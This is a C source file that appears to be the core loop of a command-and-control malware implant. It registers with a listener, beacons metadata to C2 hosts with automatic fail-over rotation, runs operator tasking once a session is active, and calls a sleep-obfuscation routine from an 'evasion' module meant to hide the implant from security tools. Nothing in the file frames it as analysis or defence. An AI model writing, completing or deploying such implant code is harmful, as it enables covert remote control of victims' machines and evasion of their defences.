#include "../../headers/agent/agent.h"
#include "../../headers/package/package.h"
#include "../../headers/TaskController/TaskController.h"
#include "../../headers/helpers/ListManager.h"
#include "../../headers/agent/evasion/SleepObfu/SleepObfMain.h"

pAgent agent = { 0 };

void AgentMain() {
	
	INT err;
	Agent Agent = { 0 };
	agent = &Agent;

	if ((err = init_agent()) != 0) {
		printf("[error] attempting to initialize agent\n");
	}

	if ((err = RegisterAgent()) != 0) {
		printf("[error] attempting to register agent\n");
	}

	AgentRoutine();

}

void AgentRoutine() {
	while (TRUE) {
		if (!agent->session->Active)
		{
			if ((PackageSendMetaDataPackage(agent->MetaDataPackage, NULL, NULL)) != PACKAGE_SUCCESS) {
				printf("[error] attempting to send package\n");
				agent->config->listenerConfig->CurrentHost->NumFailures++;
				if (agent->config->listenerConfig->CurrentHost->NumFailures >= MAX_HOST_FAILURES)
				{
					agent->config->listenerConfig->CurrentHost->NumFailures = 0;
					SelectHost(HOST_ROTATION_FAIL_OVER);
				}
			}
			agent->config->listenerConfig->CurrentHost->NumFailures = 0;
		}

		if (agent->session->Active) {
			TaskingRoutine();
		}

		PerformSleepObf();
	}
}